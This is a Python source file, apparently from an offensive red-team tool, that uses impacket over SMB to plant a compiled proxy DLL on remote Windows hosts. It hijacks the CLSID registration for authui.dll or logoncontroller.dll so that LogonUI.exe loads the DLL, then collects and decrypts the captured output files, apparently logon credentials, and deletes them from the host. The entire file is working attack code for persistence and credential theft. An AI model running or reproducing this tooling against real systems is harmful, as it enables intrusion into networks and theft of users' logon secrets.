import time
from impacket.smbconnection import SMBConnection, SessionError
from impacket import smb
from impacket.dcerpc.v5 import rrp
from shutil import copy
from os import environ, path

import logging
import pefile
import platform
import subprocess
import tempfile
import hashlib
from io import BytesIO

from remoteRegistry import RemoteRegistry


class LogonUIFox:
    def __init__(
        self,
        domain: str,
        username: str,
        password: str,
        lmhash: str,
        nthash: str,
        aesKey: str,
        useKerberos: bool,
        dc_ip: str | None,
        tempDir: str,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.useKerberos = useKerberos
        self.dc_ip = dc_ip
        self.clsids = [
            ("2135F72A-90B5-4ED3-A7F1-8BB705AC276A", "authui.dll"),
            ("0BDC6FC7-83E3-46A4-BFA0-1BC14DBF8B38", "logoncontroller.dll"),
        ]
        self.tempDir = tempDir

    def doCLSIDPoisonning(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created
        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            smbClient.createDirectory("C$", f"{tempPath}")
        except SessionError as e:
            if e.getErrorCode() == 0xC0000035:
                # STATUS_OBJECT_NAME_COLLISION, occurs if the directory already exists
                logging.warning(
                    f"Temporary directory already exists, assuming it is ok."
                )
            else:
                logging.error(f"Error while creating C:\\{tempPath} ")
                return

        # Now access the remote registry,
        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Now let's check the origin value of the CLSID registration we are going to hijack

        # Unfortunaltely, if the SMB login was performed using kerberos, getServerOsMajor errors out.
        # Try to do the same using an anonymous session
        # This probably won't work if NTLM is fully disabled

        if self.useKerberos:
            smbClientTemp = SMBConnection(host, host, timeout=2)
            smbClientTemp.login("", "")

            if smbClientTemp.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "2135F72A-90B5-4ED3-A7F1-8BB705AC276A"
                expectedDll = "authui.dll"

            else:  # 2022 Server
                clsid = "0BDC6FC7-83E3-46A4-BFA0-1BC14DBF8B38"
                expectedDll = "logoncontroller.dll"

        else:
            if smbClient.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "2135F72A-90B5-4ED3-A7F1-8BB705AC276A"
                expectedDll = "authui.dll"

            else:  # 2022 Server
                clsid = "0BDC6FC7-83E3-46A4-BFA0-1BC14DBF8B38"
                expectedDll = "logoncontroller.dll"

        try:
            machineInprocServer = remoteRegistry.getKeyValues(
                f"HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
            )
        except rrp.DCERPCException as e:
            logging.warning(
                f"[{host}] Failed reading machine InprocServer32 HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
            )
            logging.error(e)
            return

        clsidDllPath = machineInprocServer.get("(Default)")

        # getKeyValues return a list of tuples, the first value being the type
        # Ensure that the default value exists and is of type REG_SZ or REG_EXPAND_SZ

        if clsidDllPath == None or (
            clsidDllPath[0] != rrp.REG_SZ and clsidDllPath[0] != rrp.REG_EXPAND_SZ
        ):
            logging.error(
                f"Original InprocServer does not have a default value, or unexpected type : {clsidDllPath}. Abort"
            )
            return

        originalDllPath = clsidDllPath[1].lower().split("\\")
        if originalDllPath[-2] != "system32" or originalDllPath[-1] != expectedDll:
            logging.error(
                f"[{host}]The origin CLSID is registered to an unexpected DLL : {clsidDllPath}. Aborting"
            )
            return

        # Everything seems OK, let's compile our DLL
        # Just to be sure that we do not break anything, let's retreive the original msmpeg2vdec.dll to get the exports

        try:
            dllData = BytesIO()
            smbClient.getFile("C$", f"Windows\\System32\\{expectedDll}", dllData.write)
        except SessionError as e:
            logging.error(
                f"[{host}] Failed opening/reading C:\\windows\\system32\\{expectedDll}"
            )
            logging.error(e)
            return

        # Now list exported functions to see if they contain mangled names.

        dll = pefile.PE(data=dllData.getvalue(), fast_load=False)
        dll.parse_data_directories()

        # Sanity check : ensure that it is the correct architecure
        if dll.FILE_HEADER.Machine != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]:
            logging.error("Unexpected architecture")
            return

        try:
            exports = [e for e in dll.DIRECTORY_ENTRY_EXPORT.symbols]
        except AttributeError as e:
            logging.error(
                f"[{host}] {expectedDll} exports could not be parsed. Aborting"
            )
            for exp in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                print(
                    hex(dll.OPTIONAL_HEADER.ImageBase + exp.address),
                    exp.name,
                    exp.ordinal,
                )
            logging.error(e)
            return

        # Ensure that no symbol are only exported by ordinal
        # This could be handle, but would require modify the format of the .def file
        if any([b"" == export.name for export in exports]):
            logging.debug(
                f"[{host}] {expectedDll} exports a symbol by ordinal only, aborting"
            )
            return

        # We have the exported symbols.
        # Let's compute the MD5 of the data

        dllMd5 = hashlib.md5(dllData.getvalue()).hexdigest()

        # Check if we have already created the proxy dll for this specific instance of logoncontroller
        if not path.exists(
            path.join(
                path.dirname(__file__),
                "cache",
                f'{expectedDll.removesuffix("dll") + dllMd5 + ".dll"}',
            )
        ):
            # It doesn't exist yet, let's create the exported function list for our DLL
            # The .def file is not recognized if the extension is not .def
            tempFileHandle = tempfile.NamedTemporaryFile(
                mode="w", suffix=".data", delete=False
            )
            for export in exports:
                tempFileHandle.write(
                    f"{export.name.decode()}={expectedDll.removesuffix('.dll')}.{export.name.decode()} @{export.ordinal}\n"
                )

            tempFileHandle.flush()

            # Define the target rust compiler
            # For windows, use msvc, for Linux, use mingw
            if platform.system() == "Windows":
                targetName = "x86_64-pc-windows-msvc"
            else:
                targetName = "x86_64-pc-windows-gnu"

            # Now let's compile our sideloaded DLL with the matching exports
            cargo_path = path.abspath(
                path.join(path.dirname(__file__), "..", "logonuifox")
            )

            cmd = [
                "cargo",
                "clean",
            ]

            subprocess.run(cmd, cwd=cargo_path)

            cmd = ["cargo", "build", "--target", targetName, "--release"]

            logging.info(f"[{host}] Compiling {expectedDll} ...")

            new_env = environ
            new_env["OUTPUT_PATH"] = f"C:\\{tempPath}\\logonui."
            if platform.system() == "Windows":
                from win32 import win32file

                new_env["EXPORTS_FILE"] = win32file.GetLongPathName(tempFileHandle.name)
            else:
                new_env["EXPORTS_FILE"] = tempFileHandle.name

            subprocess.run(cmd, cwd=cargo_path, env=new_env)

            # We don't need the temporary file anymore
            tempFileHandle.close()

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "logonuifox",
                        "target",
                        targetName,
                        # "debug",
                        "release",
                        "logonuifox.dll",
                    )
                ),
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "cache",
                        f'{expectedDll.removesuffix("dll") + dllMd5 + ".dll"}',
                    )
                ),
            )

        # Get our DLL data
        with open(
            path.abspath(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    f'{expectedDll.removesuffix("dll") + dllMd5 + ".dll"}',
                ),
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        uploadData = BytesIO(dllDataToUpload)

        try:
            smbClient.putFile(
                "c$",
                f"{tempPath}\\{expectedDll.removesuffix('.dll')}_{dllMd5}.dll",
                uploadData.read,
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading {expectedDll} to C:\\{tempPath}\\"
            )
            logging.error(e)
            return

        # Now we modify the CLSID registration in the registry.
        # We do not have DACL permissions on the key, so setKeyValueSZData must use the REG_OPTION_BACKUP_RESTORE option
        remoteRegistry.setKeyValueSZData(
            f"HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\",
            "(Default)",
            rrp.REG_EXPAND_SZ,
            f"C:\\{tempPath}\\{expectedDll.removesuffix('.dll')}_{dllMd5}.dll",
        )

        print(f"[{host}] Successfully poisonned LogonUI.exe")

    def cleanup(self, host: str) -> None:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Access the remote registry, to cleanup the HKCR CLSID registration

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Unfortunaltely, if the SMB login was performed using kerberos, getServerOsMajor errors out.
        # Try to do the same using an anonymous session
        # This probably won't work if NTLM is fully disabled

        if self.useKerberos:
            smbClientTemp = SMBConnection(host, host, timeout=2)
            smbClientTemp.login("", "")

            if smbClientTemp.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "2135F72A-90B5-4ED3-A7F1-8BB705AC276A"
                expectedDll = "authui.dll"
            else:
                clsid = "0BDC6FC7-83E3-46A4-BFA0-1BC14DBF8B38"
                expectedDll = "logoncontroller.dll"
        else:
            if smbClient.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "2135F72A-90B5-4ED3-A7F1-8BB705AC276A"
                expectedDll = "authui.dll"
            else:
                clsid = "0BDC6FC7-83E3-46A4-BFA0-1BC14DBF8B38"
                expectedDll = "logoncontroller.dll"

        try:
            remoteRegistry.setKeyValueSZData(
                f"HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\",
                "(Default)",
                rrp.REG_EXPAND_SZ,
                f"%SystemRoot%\\System32\\{expectedDll}",
            )
        except Exception as e:
            logging.error(
                f"[{host}] Error cleaning up HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\"
            )
            logging.error(e)

        # Now cleanup the proxy DLL in the temp dir
        # This may file, notably if LogonUI.exe is running.
        # This is OK, the DLL won't be loaded on subsequent LogonUI runs, it just needs later cleanup

        try:
            filesInTempDir: list[smb.SharedFile] = smbClient.listPath(
                "c$", f"Windows\\Temp\\{self.tempDir}\\*"
            )

            dllsInDirectory = [
                f.get_longname()
                for f in filesInTempDir
                if f.get_longname().endswith(".dll")
            ]

            targetFiles = [
                i
                for i in dllsInDirectory
                if i.startswith("logoncontroller") or i.startswith("authui")
            ]
            for file in targetFiles:
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.warning(
                        f"[{host}] Could not delete C:\\Windows\\Temp\\{self.tempDir}\\{file}, it is probably in use."
                    )

        except SessionError:
            logging.info(
                f"[{host}] Failed listing files in C:\\Windows\\Temp for cleanup."
            )

        print(f"[{host}] LogonUI.exe cleanup complete !")

    def collect(self, host, box):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                "C$", f"Windows/Temp/{self.tempDir}/*"
            )

            outputFiles = [
                f.get_longname()
                for f in filesInConfigDirectory
                if f.get_longname().startswith("logonui.")
            ]

            for file in outputFiles:
                try:
                    outputData = BytesIO()
                    smbClient.getFile(
                        "C$", f"Windows\\Temp\\{self.tempDir}\\{file}", outputData.write
                    )
                except SessionError:
                    logging.error(
                        f"[{host}] Failed opening/reading C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

                plaintexts = box.decryptFile(outputData.getvalue())
                with open(
                    path.join(
                        path.dirname(__file__),
                        "output",
                        f"logonui-{int(time.time())}.txt",
                    ),
                    "a",
                ) as f:
                    for plaintext in plaintexts:
                        f.write(plaintext + "\n")

                # Now, let's delete the file one the remote host
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.error(
                        f"[{host}] Failed deleting C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

        except SessionError as e:
            logging.error(
                f"[{host}] Failed opening directory C:\\Windows\\Temp\\{self.tempDir}"
            )
            logging.error(e)
